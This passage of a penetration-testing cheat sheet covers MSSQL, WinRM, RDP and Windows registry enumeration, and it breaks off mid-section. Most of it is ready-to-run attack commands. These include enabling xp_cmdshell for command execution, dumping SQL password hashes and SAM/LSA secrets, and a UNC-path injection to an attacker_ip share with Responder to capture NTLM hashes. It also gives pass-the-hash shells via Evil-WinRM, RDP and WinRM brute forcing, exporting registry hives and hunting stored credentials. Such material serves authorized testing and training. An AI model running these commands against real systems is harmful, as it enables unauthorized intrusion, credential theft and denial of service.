**xp_cmdshell Enumeration**

```sql
-- Check if xp_cmdshell is enabled
SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Attempt to enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute command
EXEC xp_cmdshell 'whoami';

-- Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
```

**sp_OACreate (COM Object) Enumeration**

```sql
-- Check if Ole Automation Procedures enabled
SELECT value_in_use FROM sys.configurations WHERE name = 'Ole Automation Procedures';

-- Enable Ole Automation
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Test COM execution (write file)
DECLARE @OLE INT;
DECLARE @FileID INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXEC sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\temp\test.txt', 8, 1;
EXEC sp_OAMethod @FileID, 'WriteLine', Null, 'Test content';
EXEC sp_OADestroy @FileID;
EXEC sp_OADestroy @OLE;
```

**Custom Extended Stored Procedures**

```sql
-- List extended stored procedures
SELECT name FROM sys.objects WHERE type = 'X';

-- Check for custom XPs in master database
SELECT * FROM master..sysobjects WHERE xtype = 'X' AND name LIKE 'xp_%';

-- Attempt to execute
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows\CurrentVersion', 'ProgramFilesDir';
```

**Agent Jobs (Requires SQLAgentUser privileges)**

```sql
-- Check if SQL Agent is running
EXEC master.dbo.xp_servicecontrol 'QUERYSTATE', 'SQLServerAGENT';

-- List agent jobs
EXEC msdb.dbo.sp_help_job;

-- Get job details
EXEC msdb.dbo.sp_help_job @job_name = 'JobName';

-- List job steps
EXEC msdb.dbo.sp_help_jobstep @job_name = 'JobName';

-- Check job history
EXEC msdb.dbo.sp_help_jobhistory @job_name = 'JobName';
```

**Impersonation Enumeration**

```sql
-- Check if current user can impersonate others
SELECT name, type_desc, permission_name, state_desc
FROM sys.server_permissions sp
JOIN sys.server_principals pr ON sp.grantee_principal_id = pr.principal_id
WHERE permission_name = 'IMPERSONATE';

-- List impersonatable logins
SELECT DISTINCT pr.name
FROM sys.server_permissions sp
JOIN sys.server_principals pr ON sp.grantor_principal_id = pr.principal_id
WHERE sp.permission_name = 'IMPERSONATE';

-- Impersonate user
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
REVERT;

-- Check database impersonation
SELECT pr.name, pe.permission_name, pe.state_desc
FROM sys.database_permissions pe
JOIN sys.database_principals pr ON pe.grantee_principal_id = pr.principal_id
WHERE pe.permission_name = 'IMPERSONATE';
```

**PowerUpSQL Privilege Escalation Enumeration**

```powershell
# Check for common escalation paths
Invoke-SQLAudit -Instance target.com -Username sa -Password password

# Check for weak configurations
Invoke-SQLAuditWeakLoginPw -Instance target.com

# Test impersonation
Invoke-SQLAuditPrivImpersonateLogin -Instance target.com -Username sa -Password password

# Check for dangerous stored procedures
Get-SQLStoredProcedureXP -Instance target.com -Username sa -Password password

# Enumerate service account
Get-SQLServiceAccount -Instance target.com
```

### MSSQL Credential Harvesting

**Extract Password Hashes**

```sql
-- SQL Server 2000-2005 (requires sysadmin)
SELECT name, password FROM master..sysxlogins;

-- SQL Server 2008+ (requires CONTROL SERVER)
SELECT name, password_hash FROM sys.sql_logins;

-- Crack with hashcat mode 1731 (MSSQL 2012+)
-- Format: 0x0200...
```

**Metasploit Hash Dumping**

```bash
# Dump MSSQL hashes
use auxiliary/admin/mssql/mssql_hashdump
set RHOSTS target.com
set USERNAME sa
set PASSWORD password
run
```

**PowerUpSQL Hash Extraction**

```powershell
# Dump password hashes
Get-SQLServerPasswordHash -Instance target.com -Username sa -Password password

# Export to file
Get-SQLServerPasswordHash -Instance target.com -Username sa -Password password | Export-Csv hashes.csv
```

**Credential Storage in Tables**

```sql
-- Search for common credential columns
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME 
FROM INFORMATION_SCHEMA.COLUMNS 
WHERE COLUMN_NAME LIKE '%password%' 
   OR COLUMN_NAME LIKE '%pwd%'
   OR COLUMN_NAME LIKE '%pass%'
   OR COLUMN_NAME LIKE '%credential%';

-- Search table contents
EXEC sp_MSforeachtable "SELECT '?' AS TableName, * FROM ? WHERE EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = PARSENAME('?', 1) AND COLUMN_NAME LIKE '%password%')";
```

### MSSQL Service Enumeration (From Windows Host)

**Windows Services**

```cmd
REM List MSSQL services
sc query type= service state= all | findstr /i "sql"

REM Service details
sc qc MSSQLSERVER

REM Service account
wmic service where "name like '%SQL%'" get name, startname

REM Service binary path
reg query "HKLM\SYSTEM\CurrentControlSet\Services\MSSQLSERVER" /v ImagePath
```

**PowerShell Service Enumeration**

```powershell
# Get SQL Server services
Get-Service | Where-Object {$_.DisplayName -like "*SQL*"}

# Service details
Get-WmiObject Win32_Service | Where-Object {$_.Name -like "*SQL*"} | Select-Object Name, PathName, StartName, State

# Service account privileges
Get-SQLServiceAccount -Instance target.com
```

**Registry Enumeration**

```cmd
REM Instance names
reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL"

REM Connection strings (may contain credentials)
reg query "HKLM\SOFTWARE" /s /f "connection" | findstr /i "password pwd"

REM UDL files (Universal Data Link - credentials)
dir /s /b C:\*.udl
```

### CrackMapExec MSSQL Module

```bash
# MSSQL authentication
crackmapexec mssql target.com -u username -p password

# Execute query
crackmapexec mssql target.com -u sa -p password -q "SELECT @@version"

# Execute command via xp_cmdshell
crackmapexec mssql target.com -u sa -p password -x "whoami"

# Multiple targets
crackmapexec mssql 192.168.1.0/24 -u sa -p password --shares
```

### Network Traffic Analysis

**Wireshark TDS Protocol Filters**

```
# Tabular Data Stream (MSSQL protocol)
tds

# TDS login packets
tds.type == 0x10

# SQL batch requests
tds.type == 0x01

# Extract SQL queries
tds.query

# Filter by server
ip.addr == 192.168.1.100 && tds
```

**tcpdump MSSQL Traffic**

```bash
# Capture MSSQL traffic
tcpdump -i eth0 -w mssql.pcap 'port 1433'

# Verbose output
tcpdump -i eth0 -A 'port 1433'
```

### MSSQL Enumeration via UNC Path Injection

[Inference: Forces MSSQL to authenticate to attacker-controlled SMB share, capturing NTLM hash]

```sql
-- Capture MSSQL service account hash via Responder
EXEC master..xp_dirtree '\\attacker_ip\share';

-- Alternative methods
EXEC master..xp_fileexist '\\attacker_ip\share\file';
EXEC sp_attach_db 'test', '\\attacker_ip\share\test.mdf';
BACKUP DATABASE master TO DISK = '\\attacker_ip\share\backup.bak';
```

**Responder Setup**

```bash
# Start Responder to capture hash
responder -I eth0 -v

# Execute UNC injection in MSSQL
# Responder will capture NTLMv2 hash of SQL service account

# Crack with hashcat
hashcat -m 5600 captured_hash.txt wordlist.txt
```

### MSSQL Enumeration Cheat Sheet

**Initial Recon:**

1. Port scan: 1433/TCP (default), 1434/UDP (browser service)
2. Version detection: Nmap, banner grabbing
3. Instance discovery: UDP broadcast, SPN enumeration

**Authentication:**

1. Test for weak credentials: sa/blank, sa/sa, common passwords
2. Windows authentication with domain credentials
3. Pass-the-hash if NTLM hash obtained

**Post-Authentication:**

1. Check sysadmin privileges
2. Enumerate databases, tables, stored procedures
3. Search for credentials in tables
4. Enumerate linked servers
5. Check for xp_cmdshell, sp_OACreate
6. Test impersonation capabilities
7. Enumerate SQL Agent jobs

**Important Related Topics:**

- **MSSQL Injection**: Error-based, boolean-based, time-based, stacked queries
- **MSSQL Exploitation**: xp_cmdshell abuse, CLR assemblies, Agent job abuse
- **MSSQL Persistence**: Startup stored procedures, triggers, backdoor accounts
- **MSSQL Post-Exploitation**: Local privilege escalation, token impersonation, credential extraction

---

## WinRM Enumeration

Windows Remote Management (WinRM) is Microsoft's implementation of the WS-Management protocol, enabling remote system administration. WinRM typically operates on ports 5985 (HTTP) and 5986 (HTTPS).

### WinRM Service Detection

**Nmap WinRM Detection**

```bash
# Basic WinRM port scan
nmap -p 5985,5986 <target>

# WinRM with version detection
nmap -sV -p 5985,5986 <target>

# WinRM NSE scripts
nmap -p 5985,5986 --script http-enum <target>
nmap -p 5985 --script http-ntlm-info <target>

# Detailed service information
nmap -sV -p 5985,5986 --script http-title,http-headers <target>

# Check for SSL/TLS configuration on 5986
nmap -p 5986 --script ssl-cert,ssl-enum-ciphers <target>
```

**Manual HTTP Detection**

```bash
# Test WinRM HTTP endpoint
curl -v http://<target>:5985/wsman

# Expected response includes:
# <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">

# HTTPS endpoint
curl -k https://<target>:5986/wsman

# Check authentication requirements
curl -v -H "Content-Type: application/soap+xml" http://<target>:5985/wsman
```

### WinRM Authentication Testing

**Evil-WinRM - Remote Shell via WinRM**

```bash
# Basic authentication
evil-winrm -i <target> -u username -p password

# Pass-the-hash authentication
evil-winrm -i <target> -u username -H <NTLM_hash>

# Specify custom port
evil-winrm -i <target> -u username -p password -P 5986 -S

# Use SSL
evil-winrm -i <target> -u username -p password -s -P 5986

# Execute commands
evil-winrm -i <target> -u username -p password -e /path/to/commands.txt

# Upload files
# Once connected:
upload /local/path/file.exe C:\Temp\file.exe

# Download files
download C:\Users\Administrator\Desktop\flag.txt
```

**Ruby WinRM Client**

```bash
# Install winrm gem
gem install winrm winrm-fs

# Test connection with Ruby script
ruby -e "require 'winrm'; conn = WinRM::Connection.new(endpoint: 'http://<target>:5985/wsman', user: 'username', password: 'password'); conn.shell(:powershell) { |shell| puts shell.run('hostname').stdout }"
```

**PowerShell Remoting (from Windows attacker machine)**

```powershell
# Test WinRM availability
Test-WSMan -ComputerName <target>

# Create PSSession
$cred = Get-Credential
$session = New-PSSession -ComputerName <target> -Credential $cred

# Execute commands
Invoke-Command -Session $session -ScriptBlock { whoami }
Invoke-Command -Session $session -ScriptBlock { Get-Process }

# Enter interactive session
Enter-PSSession -ComputerName <target> -Credential $cred

# One-liner execution
Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock { ipconfig }
```

### WinRM User Enumeration

**Username Validation via NTLM**

```bash
# Use nmap http-ntlm-info script
nmap -p 5985 --script http-ntlm-info --script-args http-ntlm-info.root=/wsman <target>

# Output includes:
# NetBIOS_Domain_Name
# NetBIOS_Computer_Name
# DNS_Domain_Name
# DNS_Computer_Name

# Using Metasploit
msfconsole
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS <target>
run
```

**Brute Force Authentication**

```bash
# CrackMapExec with WinRM
crackmapexec winrm <target> -u users.txt -p passwords.txt

# Successful authentication indicated by (Pwn3d!)
crackmapexec winrm <target> -u administrator -p passwords.txt --continue-on-success

# Using Hydra
hydra -L users.txt -P passwords.txt <target> winrm

# Metasploit WinRM login
msfconsole
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

### WinRM Command Execution

**Remote Command Execution via WinRM**

```bash
# Using evil-winrm
evil-winrm -i <target> -u username -p password -c 'whoami'

# Multiple commands
evil-winrm -i <target> -u username -p password
# Inside shell:
*Evil-WinRM* PS C:\> whoami
*Evil-WinRM* PS C:\> systeminfo
*Evil-WinRM* PS C:\> net user
*Evil-WinRM* PS C:\> ipconfig /all

# Load PowerShell script
*Evil-WinRM* PS C:\> Invoke-Binary /path/to/local/script.ps1

# Menu command for built-in functions
*Evil-WinRM* PS C:\> menu
```

**CrackMapExec Execution**

```bash
# Execute command
crackmapexec winrm <target> -u username -p password -x "whoami"

# Execute PowerShell
crackmapexec winrm <target> -u username -p password -X '$PSVersionTable'

# Dump SAM
crackmapexec winrm <target> -u username -p password --sam

# Dump LSA secrets
crackmapexec winrm <target> -u username -p password --lsa

# Enumerate shares
crackmapexec winrm <target> -u username -p password --shares
```

### WinRM Configuration Analysis

**Check WinRM Configuration (from compromised Windows system)**

```powershell
# Check if WinRM is running
Get-Service WinRM

# View WinRM configuration
winrm get winrm/config

# Check listeners
winrm enumerate winrm/config/listener

# View authentication methods
winrm get winrm/config/client/auth
winrm get winrm/config/service/auth

# Check trusted hosts
Get-Item WSMan:\localhost\Client\TrustedHosts

# View maximum memory per shell
winrm get winrm/config/winrs
```

**Enumerate WinRM from Linux**

```bash
# Using wsmancli
wsman identify -h <target> -P 5985 -u username -p password

# Enumerate CIM classes
wsmancli -a basic -u username -p password -h <target>:5985 enumerate http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_OperatingSystem

# Custom SOAP requests
curl -u username:password -H "Content-Type: application/soap+xml" -d @enumerate.xml http://<target>:5985/wsman
```

## RDP Enumeration

Remote Desktop Protocol (RDP) provides graphical remote access to Windows systems, typically on port 3389. RDP enumeration reveals version information, security configurations, and potential vulnerabilities.

### RDP Service Detection

**Nmap RDP Scanning**

```bash
# Basic RDP detection
nmap -p 3389 <target>

# RDP with version detection
nmap -sV -p 3389 <target>

# RDP NSE scripts
nmap -p 3389 --script rdp-enum-encryption <target>
nmap -p 3389 --script rdp-ntlm-info <target>
nmap -p 3389 --script rdp-vuln-ms12-020 <target>

# Check for BlueKeep vulnerability (CVE-2019-0708)
nmap -p 3389 --script rdp-vuln-cve-2019-0708 <target>

# All RDP scripts
nmap -p 3389 --script "rdp-*" <target>

# Comprehensive scan
nmap -sV -p 3389 --script "rdp-* and not brute" <target>
```

**RDP Encryption Level Detection**

```bash
# Check encryption methods
nmap -p 3389 --script rdp-enum-encryption <target>

# Output shows:
# - Security layer (RDP, TLS, CredSSP)
# - Encryption level (None, Low, Client Compatible, High, FIPS)
```

### RDP Version and OS Fingerprinting

**Extract RDP Certificate Information**

```bash
# Using openssl
openssl s_client -connect <target>:3389 2>/dev/null | openssl x509 -noout -text

# Extract Common Name
openssl s_client -connect <target>:3389 2>/dev/null | openssl x509 -noout -subject

# Nmap certificate extraction
nmap -p 3389 --script ssl-cert <target>

# Using rdp-sec-check.pl
perl rdp-sec-check.pl <target>:3389
```

**NTLM Information Disclosure**

```bash
# Extract Windows version via NTLM
nmap -p 3389 --script rdp-ntlm-info <target>

# Output includes:
# NetBIOS_Domain_Name
# NetBIOS_Computer_Name
# DNS_Domain_Name
# DNS_Computer_Name
# DNS_Tree_Name
# Product_Version (e.g., 10.0.17763 = Windows Server 2019)

# Manual NTLM probing with Python script
```

```python
#!/usr/bin/env python3
import socket
import struct

target = "<target_ip>"
port = 3389

# X.224 Connection Request with NTLM
rdp_neg = b"\x03\x00\x00\x2b\x26\xe0\x00\x00\x00\x00\x00\x43\x6f\x6f\x6b\x69\x65\x3a\x20\x6d\x73\x74\x73\x68\x61\x73\x68\x3d\x75\x73\x65\x72\x0d\x0a\x01\x00\x08\x00\x03\x00\x00\x00"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target, port))
sock.send(rdp_neg)
response = sock.recv(1024)
print(response.hex())
sock.close()
```

### RDP User Enumeration

**Username Validation**

```bash
# Using rdp-sec-check
perl rdp-sec-check.pl <target>:3389

# CrackMapExec RDP enumeration
crackmapexec rdp <target> -u '' -p ''

# Check for user enumeration via timing
# Valid users may have different response times
```

[Inference] RDP user enumeration is more restricted than other protocols. Timing attacks or error message differences may reveal valid usernames, but modern Windows versions mitigate this.

**Check for Guest Account Access**

```bash
# Attempt Guest login
xfreerdp /v:<target> /u:Guest /p:''

# Check with CrackMapExec
crackmapexec rdp <target> -u Guest -p ''
```

### RDP Brute Force and Password Spray

**Hydra RDP Brute Force**

```bash
# Basic brute force
hydra -l administrator -P passwords.txt rdp://<target>

# Multiple users
hydra -L users.txt -P passwords.txt rdp://<target>

# Specific domain
hydra -l DOMAIN\\username -P passwords.txt rdp://<target>

# Parallel tasks (careful with account lockout)
hydra -l administrator -P passwords.txt -t 4 rdp://<target>
```

**CrackMapExec Password Spray**

```bash
# Single password across multiple users
crackmapexec rdp <target> -u users.txt -p 'Password123'

# Password spray with delay (avoid lockout)
crackmapexec rdp <target> -u users.txt -p passwords.txt --continue-on-success

# Check for successful login
crackmapexec rdp <target> -u administrator -p 'Password123'
```

**Crowbar - RDP Brute Force Tool**

```bash
# Basic usage
crowbar -b rdp -s <target>/32 -u administrator -C passwords.txt

# Multiple targets
crowbar -b rdp -s 192.168.1.0/24 -u administrator -C passwords.txt

# Custom port
crowbar -b rdp -s <target>/32 -u administrator -C passwords.txt -n 3390
```

### RDP Session Hijacking Enumeration

**Enumerate Active RDP Sessions (from compromised system)**

```cmd
# Query user sessions
quser
qwinsta

# Detailed session information
query session

# Output format:
# SESSIONNAME  USERNAME  ID  STATE  TYPE  DEVICE
```

```powershell
# PowerShell query
Get-Process -Name rdpclip
qwinsta /server:<target>

# Enumerate logged-in users
query user /server:<target>
```

**Identify RDP Connections from Logs**

```powershell
# Event log analysis (from compromised system)
Get-WinEvent -LogName 'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational' | Where-Object {$_.Id -eq 21} | Select-Object TimeCreated, Message

# Event ID 21: Successful logon
# Event ID 22: Shell start notification
# Event ID 23: Logoff
# Event ID 24: Disconnected
# Event ID 25: Reconnection succeeded
```

### RDP Vulnerability Scanning

**BlueKeep (CVE-2019-0708)**

```bash
# Nmap detection
nmap -p 3389 --script rdp-vuln-cve-2019-0708 <target>

# Metasploit scanner
msfconsole
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <target>
run
```

[Unverified] BlueKeep affects unpatched Windows 7, Windows Server 2008 R2, and older systems. Exploitation can cause system crashes.

**MS12-020 (CVE-2012-0002)**

```bash
# Nmap detection
nmap -p 3389 --script rdp-vuln-ms12-020 <target>

# Metasploit auxiliary
msfconsole
use auxiliary/scanner/rdp/ms12_020_check
set RHOSTS <target>
run

# DoS exploit (use cautiously)
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
```

**CredSSP Information Disclosure (CVE-2018-0886)**

```bash
# Check if CredSSP is required
nmap -p 3389 --script rdp-enum-encryption <target>

# If "CredSSP" is enforced, older clients may be vulnerable
```

### RDP Connection Testing

**xfreerdp - RDP Client from Linux**

```bash
# Basic connection
xfreerdp /v:<target> /u:username /p:password

# Specific domain
xfreerdp /v:<target> /u:DOMAIN\\username /p:password

# Custom resolution
xfreerdp /v:<target> /u:username /p:password /size:1920x1080

# Fullscreen
xfreerdp /v:<target> /u:username /p:password /f

# Disable NLA (Network Level Authentication)
xfreerdp /v:<target> /u:username /p:password -sec-nla

# Share local directory
xfreerdp /v:<target> /u:username /p:password /drive:share,/tmp

# Enable clipboard
xfreerdp /v:<target> /u:username /p:password +clipboard

# Certificate warning bypass
xfreerdp /v:<target> /u:username /p:password /cert-ignore

# Port forwarding through RDP
xfreerdp /v:<target> /u:username /p:password /port:3390
```

**rdesktop - Alternative RDP Client**

```bash
# Basic connection
rdesktop <target>

# With credentials
rdesktop -u username -p password <target>

# Domain authentication
rdesktop -u DOMAIN\\username -p password <target>

# Fullscreen
rdesktop -f <target>

# Custom resolution
rdesktop -g 1920x1080 <target>

# 32-bit color depth
rdesktop -a 32 <target>

# Disable encryption (for older systems)
rdesktop -E <target>
```

### RDP Network Level Authentication (NLA) Detection

**Check NLA Requirement**

```bash
# Nmap encryption enumeration
nmap -p 3389 --script rdp-enum-encryption <target>

# If "CredSSP" (NLA) required, shows:
# Security layer: CredSSP (NLA)

# Test connection without NLA
xfreerdp /v:<target> -sec-nla

# If NLA disabled, older protocols accepted
```

**Implications of NLA Status**:

- **NLA Enabled**: Credentials required before RDP session establishment (more secure)
- **NLA Disabled**: Session established before authentication (vulnerable to certain attacks, allows credential brute forcing)

### RDP Session Forensics

**RDP Bitmap Cache Analysis** (from compromised system)

```bash
# Location of cached bitmaps
# Windows: C:\Users\<username>\AppData\Local\Microsoft\Terminal Server Client\Cache\

# Extract cached images with bmc-tools
python bmc-tools.py -s /path/to/Cache/bcache*.bmc -d ./output/

# View reconstructed screenshots
ls ./output/*.bmp
```

**Registry Artifacts**

```cmd
# Recent RDP connections (from client)
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s

# MRU (Most Recently Used) connections
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"

# Saved credentials
cmdkey /list
```

## Windows Registry Analysis

The Windows Registry is a hierarchical database storing system and application configuration. Registry analysis reveals user activity, installed software, persistence mechanisms, and sensitive data.

### Registry Hive Overview

**Primary Registry Hives**:

- **HKEY_LOCAL_MACHINE (HKLM)**: System-wide configuration
    - Location: `C:\Windows\System32\config\`
    - Files: `SAM`, `SECURITY`, `SOFTWARE`, `SYSTEM`, `DEFAULT`
- **HKEY_CURRENT_USER (HKCU)**: Current user configuration
    - Location: `C:\Users\<username>\NTUSER.DAT`
- **HKEY_USERS (HKU)**: All user profiles
- **HKEY_CLASSES_ROOT (HKCR)**: File associations and COM objects
- **HKEY_CURRENT_CONFIG**: Hardware profiles

### Remote Registry Enumeration

**Check if Remote Registry is Enabled**

```bash
# Nmap detection
nmap -p 445 --script smb-enum-services <target> | grep -i "RemoteRegistry"

# CrackMapExec
crackmapexec smb <target> -u username -p password --services | grep -i remote

# Using rpcclient
rpcclient -U username <target>
> srvinfo
```

**Access Remote Registry via SMB**

```bash
# Using CrackMapExec
crackmapexec smb <target> -u username -p password --reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

# Using impacket-reg
impacket-reg <domain>/username:password@<target> query -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

# Enumerate registry keys
impacket-reg <domain>/username:password@<target> query -keyName HKLM\\SYSTEM\\CurrentControlSet\\Services
```

**Windows Remote Registry Access**

```powershell
# PowerShell remoting to read registry
$session = New-PSSession -ComputerName <target> -Credential (Get-Credential)
Invoke-Command -Session $session -ScriptBlock { Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" }

# Using reg.exe over network
reg query "\\<target>\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /s

# Requires Administrator privileges and RemoteRegistry service running
```

### Local Registry Analysis (from compromised system)

**Query Registry Keys**

```cmd
# Query specific key
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion"

# Recursive query
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion" /s

# Query specific value
reg query "HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName" /v ComputerName

# Export registry key to file
reg export "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion" output.reg

# Export entire hive
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
reg save HKLM\SECURITY C:\Temp\security.hive
```

**PowerShell Registry Access**

```powershell
# Get registry value
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"

# Specific property
(Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ProductName

# List subkeys
Get-ChildItem -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion"

# Recursive listing
Get-ChildItem -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Recurse

# Search for specific value
Get-ChildItem -Path HKLM:\SOFTWARE -Recurse | Get-ItemProperty | Where-Object {$_.PSObject.Properties.Name -contains "password"}
```

### Persistence Mechanism Detection

**Autoruns and Startup Locations**

```cmd
# Run keys (most common persistence)
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# WOW64 32-bit keys on 64-bit systems
reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"

# RunServices
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices"

# Winlogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Shell value (common hijack point)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell

# Userinit (another hijack point)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
```

**Services and Drivers**

```cmd
# Enumerate services
reg query "HKLM\SYSTEM\CurrentControlSet\Services"

# Find services with ImagePath
reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s /f "ImagePath"

# Suspicious service paths (look for non-standard locations)
reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s | findstr /i "ImagePath" | findstr /i /v "system32"
```

**Scheduled Tasks**

```cmd
# Scheduled task registry location
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree" /s
```

**Browser Helper Objects (BHOs)**

```cmd
# Internet Explorer BHOs
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```

**AppInit_DLLs** (deprecated but still used)

```cmd
# DLLs loaded by every process
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs
reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs
```

### Credential and Sensitive Data Hunting

**Stored Credentials in Registry**

```cmd
# VNC passwords (encrypted but weak)
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password

# PuTTY sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# Windows Autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon

# SNMP community strings
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"

# Unattended install credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Unattend" /s
```

**Search for Keywords**

```powershell
# PowerShell recursive search
Get-ChildItem -Path HKLM:\SOFTWARE -Recurse -ErrorAction SilentlyContinue | Get-ItemProperty | Select-Object -Property * | Select-String -Pattern "password"

# Search for specific patterns
Get-ChildItem -Path HKCU:\SOFTWARE -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
    Get-ItemProperty $_.PSPath | Select-Object -Property *
} | Where-Object {$_ -match "password|pwd|credential|api|key|token"}
```

### Installed Software Enumeration

**Software Inventory**

```cmd
# Installed applications (64-bit)
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s

# Installed applications (32-bit on 64-bit systems)
reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s

# User-specific installations
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s

# Extract DisplayName and DisplayVersion
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr /i "DisplayName DisplayVersion"
```

**PowerShell Software Enumeration**

```powershell
# List installed software
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate

# Include 32-bit on 64-bit systems
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate

# Export to CSV
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Export-Csv -Path software.csv
```

### Network Configuration from Registry

**Network Interfaces**

```cmd
# Network adapter configuration
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /s

# DNS servers
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "NameServer"

# WINS servers
reg query "HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters"
```

**Firewall Rules** (older Windows versions)

```cmd
# Windows Firewall settings
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s
```

### User Activity and Forensics

**Recent Documents and MRU**

```cmd
# Recent documents
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /s

# Typed URLs (Internet Explorer)
reg query "HKCU\SOFTWARE\Microsoft\Internet Explorer\TypedURLs"

# Run MRU (programs run via Win+R)
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"

# Search history
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery"

# Recently opened Office documents
reg query "HKCU\SOFTWARE\Microsoft\Office\<version>\<application>\File MRU" /s
```

**USB Device History**

```cmd
# USB devices connected
reg query "HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR" /s

# Last write time indicates when device was connected
reg query "HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR" /s | findstr "FriendlyName"

# MountedDevices
reg query "HKLM\SYSTEM\MountedDevices"
```

**User Accounts**

```cmd
# Local users
